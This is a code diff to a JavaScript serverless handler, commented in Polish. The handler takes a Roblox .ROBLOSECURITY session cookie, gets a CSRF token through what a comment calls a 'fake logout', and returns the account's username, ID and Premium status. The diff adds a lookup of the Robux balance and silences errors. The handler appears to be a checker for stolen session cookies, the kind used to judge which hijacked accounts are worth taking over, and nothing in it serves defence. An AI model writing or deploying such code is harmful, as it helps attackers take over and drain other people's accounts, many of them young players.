@@ -13,11 +13,11 @@ export default async function handler(req, res) {
 
   const { cookie } = req.body || {};
   if (!cookie || typeof cookie !== 'string' || cookie.length < 200) {
-    return res.status(400).json({ error: 'Brak poprawnego cookie' });
+    return res.status(400).json({ error: 'Brak poprawnego cookie (zbyt krótkie lub brak)' });
   }
 
   try {
-    // Krok 1 – pobierz X-CSRF-Token
+    // Krok 1 – pobierz X-CSRF-Token (fake logout)
     const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
       method: 'POST',
       headers: {
@@ -28,10 +28,10 @@ export default async function handler(req, res) {
 
     const csrfToken = tokenRes.headers.get('x-csrf-token');
     if (!csrfToken) {
-      throw new Error('Nie udało się pobrać X-CSRF-Token – cookie prawdopodobnie nieważne');
+      throw new Error('Nie udało się pobrać X-CSRF-Token – cookie prawdopodobnie nieważne lub wygasłe');
     }
 
-    // Krok 2 – pobierz dane użytkownika
+    // Krok 2 – pobierz dane użytkownika (username, id, etc.)
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
       method: 'GET',
       headers: {
@@ -45,13 +45,13 @@ export default async function handler(req, res) {
       if (userRes.status === 401) {
         throw new Error('Cookie nieważne lub wygasłe (401 Unauthorized)');
       }
-      throw new Error(`Błąd Roblox: ${userRes.status} – ${await userRes.text()}`);
+      throw new Error(`Błąd Roblox API (użytkownik): ${userRes.status} – ${await userRes.text()}`);
     }
 
     const userData = await userRes.json();
     const userId = userData.id;
 
-    // Krok 3 – sprawdź czy ma Premium
+    // Krok 3 – sprawdź Premium
     let hasPremium = false;
     try {
       const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
@@ -65,12 +65,31 @@ export default async function handler(req, res) {
 
       if (premiumRes.ok) {
         const premiumData = await premiumRes.json();
-        hasPremium = !!premiumData; // true / false
+        hasPremium = !!premiumData; // true/false
       }
-      // Jeśli nie ok → zostawiamy false (najczęściej 403/401 przy złym tokenie)
     } catch (premiumErr) {
       // cichy fail – premium nie jest krytyczne
-      console.error('Premium check error:', premiumErr);
+    }
+
+    // Krok 4 – pobierz Robux (saldo)
+    let robux = 0;
+    try {
+      const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
+        method: 'GET',
+        headers: {
+          'Cookie': `.ROBLOSECURITY=${cookie}`,
+          'X-CSRF-TOKEN': csrfToken,
+          'Accept': 'application/json',
+        },
+      });
+
+      if (currencyRes.ok) {
+        const currencyData = await currencyRes.json();
+        robux = currencyData.robux || 0;
+      }
+      // Jeśli 403/401 → csrf stary lub cookie złe → robux zostaje 0
+    } catch (currencyErr) {
+      // cichy fail
     }
 
     res.status(200).json({
@@ -78,10 +97,11 @@ export default async function handler(req, res) {
       username: userData.name,
       displayName: userData.displayName || userData.name,
       userId: userData.id,
-      hasPremium: hasPremium
+      hasPremium: hasPremium,
+      robux: robux
     });
 
   } catch (err) {
-    res.status(500).json({ error: err.message });
+    res.status(500).json({ error: err.message || 'Nieznany błąd serwera' });
   }
 }
